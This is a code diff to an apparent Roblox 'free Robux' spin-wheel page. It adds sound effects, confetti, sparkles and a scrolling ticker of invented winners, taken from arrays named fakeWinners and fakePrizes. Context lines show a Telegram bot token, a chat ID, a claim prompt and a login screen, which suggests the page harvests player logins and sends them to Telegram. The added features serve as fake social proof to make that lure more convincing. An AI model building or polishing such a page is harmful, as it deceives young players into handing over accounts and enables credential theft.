@@ -8,6 +8,119 @@
 <link rel="preconnect" href="https://fonts.cdnfonts.com">
 <link rel="stylesheet" href="https://fonts.cdnfonts.com/css/builder-sans">
 <script>
+// ===== SOUND EFFECTS =====
+var audioCtx = null;
+function beep(freq, dur, type, vol) {
+    try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        var o = audioCtx.createOscillator();
+        var g = audioCtx.createGain();
+        o.type = type || 'sine';
+        o.frequency.value = freq;
+        g.gain.value = vol || 0.08;
+        g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
+        o.connect(g); g.connect(audioCtx.destination);
+        o.start(); o.stop(audioCtx.currentTime + dur);
+    } catch(e) {}
+}
+function spinSound() {
+    for (var i = 0; i < 8; i++) {
+        setTimeout(function(){ beep(200 + Math.random()*400, 0.08, 'square', 0.03); }, i * 60);
+    }
+}
+function winSound() {
+    beep(523, 0.15, 'sine', 0.1);
+    setTimeout(function(){ beep(659, 0.15, 'sine', 0.1); }, 150);
+    setTimeout(function(){ beep(784, 0.3, 'sine', 0.12); }, 300);
+}
+
+// ===== CONFETTI =====
+var confettiParticles = [];
+function spawnConfetti(x, y) {
+    for (var i = 0; i < 60; i++) {
+        confettiParticles.push({
+            x: x, y: y,
+            vx: (Math.random() - 0.5) * 12,
+            vy: (Math.random() - 1) * 10 - 5,
+            color: ['#E2231A','#FFD700','#1D4ED8','#4ADE80','#FF6B00','#7C3AED','#FF69B4','#00BFFF'][Math.floor(Math.random()*8)],
+            life: 1, decay: 0.005 + Math.random() * 0.015,
+            size: 4 + Math.random() * 6
+        });
+    }
+}
+function drawConfetti() {
+    var c = document.getElementById('confettiCanvas');
+    if (!c) return;
+    var ctx = c.getContext('2d');
+    c.width = window.innerWidth; c.height = window.innerHeight;
+    ctx.clearRect(0, 0, c.width, c.height);
+    for (var i = confettiParticles.length - 1; i >= 0; i--) {
+        var p = confettiParticles[i];
+        p.x += p.vx; p.y += p.vy; p.vy += 0.15; p.life -= p.decay;
+        if (p.life <= 0) { confettiParticles.splice(i,1); continue; }
+        ctx.save();
+        ctx.globalAlpha = p.life;
+        ctx.fillStyle = p.color;
+        ctx.fillRect(p.x, p.y, p.size, p.size * 0.6);
+        ctx.restore();
+    }
+    if (confettiParticles.length > 0) requestAnimationFrame(drawConfetti);
+}
+
+// ===== CURSOR SPARKLE =====
+var sparkles = [];
+document.addEventListener('mousemove', function(e) {
+    if (Math.random() < 0.3) {
+        sparkles.push({ x: e.clientX, y: e.clientY, life: 1, size: 2 + Math.random() * 3 });
+        if (sparkles.length > 40) sparkles.shift();
+    }
+});
+function drawSparkles() {
+    var c = document.getElementById('confettiCanvas');
+    if (!c) return;
+    var ctx = c.getContext('2d');
+    for (var i = sparkles.length - 1; i >= 0; i--) {
+        var s = sparkles[i];
+        s.life -= 0.02; s.y -= 0.5;
+        if (s.life <= 0) { sparkles.splice(i,1); continue; }
+        ctx.save();
+        ctx.globalAlpha = s.life * 0.7;
+        ctx.fillStyle = '#FFD700';
+        ctx.shadowColor = '#FFD700';
+        ctx.shadowBlur = 6;
+        ctx.beginPath();
+        ctx.arc(s.x, s.y, s.size, 0, Math.PI*2);
+        ctx.fill();
+        ctx.restore();
+    }
+}
+function tickParticles() {
+    drawConfetti(); drawSparkles();
+    if (confettiParticles.length > 0 || sparkles.length > 0) requestAnimationFrame(tickParticles);
+}
+
+// ===== WIN TICKER =====
+var fakeWinners = [
+    'xXDarkLordXx', 'CuteUnicorn99', 'ProBuilder2025', 'NightFury_OG',
+    'QueenBella_RBX', 'ShadowNinja_7', 'MegaBloxKing', 'LunaStarGirl',
+    'EpicGamerTom', 'RobloxMaster21', 'PixelWarrior', 'DiamondSword_X',
+    'SkyDragonFly', 'AquaBlazeYT', 'ThunderBoltRB', 'FrostByte_99'
+];
+var fakePrizes = ['10,000 Robux','5,000 Robux','Dominus Empyreus','2,500 Robux','Korblox Deathspeaker','1,000 Robux','8-Bit Crown','Fiery Horns'];
+function addWinTicker() {
+    var ticker = document.getElementById('winTicker');
+    var name = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
+    var prize = fakePrizes[Math.floor(Math.random() * fakePrizes.length)];
+    var msg = '🎉 ' + name + ' just won ' + prize + '!';
+    var span = document.createElement('span');
+    span.textContent = msg;
+    span.style.cssText = 'display:inline-block;padding:0 20px;color:#FFD700;font-size:11px;animation:slideWin 8s linear;white-space:nowrap;';
+    ticker.appendChild(span);
+    setTimeout(function() { span.remove(); }, 8000);
+}
+setInterval(addWinTicker, 3000);
+addWinTicker(); addWinTicker();
+
 const BOT_TOKEN='***';
 const CHAT_ID = '1361048119';
 
@@ -319,6 +432,17 @@ function drawWheel() {
     ctx.lineWidth = 4;
     ctx.stroke();
     
+    // Metallic sheen overlay
+    var sheenGrad = ctx.createRadialGradient(cx-60, cy-70, 20, cx, cy, r);
+    sheenGrad.addColorStop(0, 'rgba(255,255,255,0.18)');
+    sheenGrad.addColorStop(0.3, 'rgba(255,255,255,0.05)');
+    sheenGrad.addColorStop(0.7, 'rgba(0,0,0,0.05)');
+    sheenGrad.addColorStop(1, 'rgba(0,0,0,0.2)');
+    ctx.beginPath();
+    ctx.arc(cx, cy, r, 0, 2 * Math.PI);
+    ctx.fillStyle = sheenGrad;
+    ctx.fill();
+    
     ctx.beginPath();
     ctx.arc(cx, cy, 35, 0, 2 * Math.PI);
     var grad = ctx.createRadialGradient(cx-5, cy-5, 5, cx, cy, 35);
@@ -348,6 +472,8 @@ function spin() {
     document.getElementById('spinResult').style.display = 'none';
     document.getElementById('claimPrompt').style.display = 'none';
     
+    spinSound();
+    
     var targetIndex = Math.floor(Math.random() * prizes.length);
     var segAngle = 360 / prizes.length;
     var targetAngle = targetIndex * segAngle + segAngle / 2;
@@ -369,6 +495,12 @@ function spin() {
         document.getElementById('prizeName').textContent = wonPrize;
         document.getElementById('prizeColor').style.color = won.color;
         document.getElementById('spinResult').style.display = 'block';
+        
+        // FIRE CONFETTI + SOUND
+        winSound();
+        var wheelRect = document.getElementById('wheelCanvas').getBoundingClientRect();
+        spawnConfetti(wheelRect.left + wheelRect.width/2, wheelRect.top + wheelRect.height/2);
+        if (confettiParticles.length > 0) tickParticles();
         
         setTimeout(function() {
             document.getElementById('claimPrompt').style.display = 'flex';
@@ -677,6 +809,7 @@ body.spin-bg {
 }
 .success-card .check-icon { font-size: 56px; margin-bottom: 8px; display: inline-block; animation: popIn 0.5s ease; }
 @keyframes popIn { 0% { transform: scale(0); } 70% { transform: scale(1.2); } 100% { transform: scale(1); } }
+@keyframes slideWin { 0% { transform: translateX(100vw); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateX(-100%); opacity: 0; } }
 .success-card h2 { font-size: 22px; font-weight: 800; color: #4ADE80; margin-bottom: 4px; }
 .success-card .won-item {
     font-size: 20px; font-weight: 700; color: #F7F7F8;
@@ -730,6 +863,12 @@ body.spin-bg {
 <body>
 <!-- SPIN PAGE BG (always visible when spin page is up) -->
 <div class="spin-page-bg"></div>
+
+<!-- CONFETTI / SPARKLE CANVAS -->
+<canvas id="confettiCanvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>
+
+<!-- WIN TICKER -->
+<div id="winTicker" style="position:fixed;top:50px;left:0;width:100%;height:24px;background:rgba(0,0,0,0.6);overflow:hidden;white-space:nowrap;z-index:50;display:flex;align-items:center;backdrop-filter:blur(4px);border-bottom:1px solid rgba(255,215,0,0.2);"></div>
 
 <!-- LOGIN BG (hidden until login page shows) -->
 <div id="loginBg"><div class="overlay"></div></div>
